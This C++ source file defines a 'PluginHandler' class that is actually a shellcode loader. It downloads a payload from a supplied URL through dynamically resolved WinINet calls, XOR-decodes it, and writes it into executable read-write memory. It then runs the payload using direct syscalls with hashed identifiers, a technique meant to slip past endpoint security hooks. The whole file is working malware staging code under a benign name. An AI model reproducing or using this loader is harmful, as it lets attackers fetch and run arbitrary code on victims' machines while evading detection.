#include "PluginHandler.h"

static auto &syscall = freshycalls::Syscall::get_instance();

PluginHandler::PluginHandler(char *Param_1, char *Param_2, char *Param_3,
                             char *Param_4) {
  memcpy(this->Param_1, Param_1, 255);
  memcpy(this->Param_2, Param_2, 255);
  memcpy(this->Param_3, Param_3, 255);
  memcpy(this->Param_4, Param_4, 255);
}

void PluginHandler::startLoadingThread() {
  std::thread LoadingThread(&PluginHandler::startLoading, this);
  LoadingThread.detach();
}

void PluginHandler::startLoading() {
  downloadPlugin();
  loadPlugin();

  delete[] this->PluginPayload;
}

void PluginHandler::downloadPlugin() {
  HINSTANCE hInstance = LoadLibraryW(L"wininet.dll");

  pInternetOpenA fnInternetOpenA =
      (pInternetOpenA)GetProcAddress(hInstance, "InternetOpenA");
  pInternetOpenUrlA fnInternetOpenUrlA =
      (pInternetOpenUrlA)GetProcAddress(hInstance, "InternetOpenUrlA");
  pInternetReadFile fnInternetReadFile =
      (pInternetReadFile)GetProcAddress(hInstance, "InternetReadFile");
  pInternetCloseHandle fnInternetCloseHandle =
      (pInternetCloseHandle)GetProcAddress(hInstance, "InternetCloseHandle");

  HINTERNET Internet = fnInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT,
                                       NULL, NULL, NULL);
  HINTERNET UrlFile;

  char *ReturnData = new char[8388608];
  int index = 0;
  if (Internet) {
    UrlFile = fnInternetOpenUrlA(Internet, this->Param_1, NULL, NULL,
                                 INTERNET_FLAG_NO_CACHE_WRITE, NULL);

    if (UrlFile) {
      char Buffer[2048];
      DWORD BytesRead;

      do {
        fnInternetReadFile(UrlFile, Buffer, 2048, &BytesRead);
        memcpy(ReturnData + index, Buffer, 2048);
        index += 2048;
        memset(Buffer, 0, 2048);
      } while (BytesRead);

      fnInternetCloseHandle(Internet);
      fnInternetCloseHandle(UrlFile);

      this->PluginPayload = new char[8388608];
      memset(this->PluginPayload, 0, 8388608);
      memcpy(this->PluginPayload, ReturnData, 8388608);
      this->PayloadSize = 8388608;
    }
  }

  fnInternetCloseHandle(Internet);
  delete[] ReturnData;
}

void PluginHandler::loadPlugin() {
  NTSTATUS Status;

  LPVOID BasePointer = nullptr;
  SIZE_T BasePointerSize = this->PayloadSize;
  SIZE_T WriteSize = this->PayloadSize;

  printf("test: %d\n", BasePointerSize);

  Status =
      syscall.CallSyscall(0x576784122622e85e, NtCurrentProcess, &BasePointer, 0,
                          &BasePointerSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  printf("NtAlloc: %x\n", Status);

  for (int i = 0; i < this->PayloadSize; i++) {
    this->PluginPayload[i] ^= this->Key[i % 10];
  }

  Status =
      syscall.CallSyscall(0x56c6c71c5dd495e4, NtCurrentProcess, BasePointer,
                          this->PluginPayload, WriteSize, nullptr);

  Status = syscall.CallSyscall(0x4473fd36f533b78a, NtCurrentThread, BasePointer,
                               nullptr, nullptr);

  syscall.CallSyscall(0x7c11e9b1caef31f1);
}
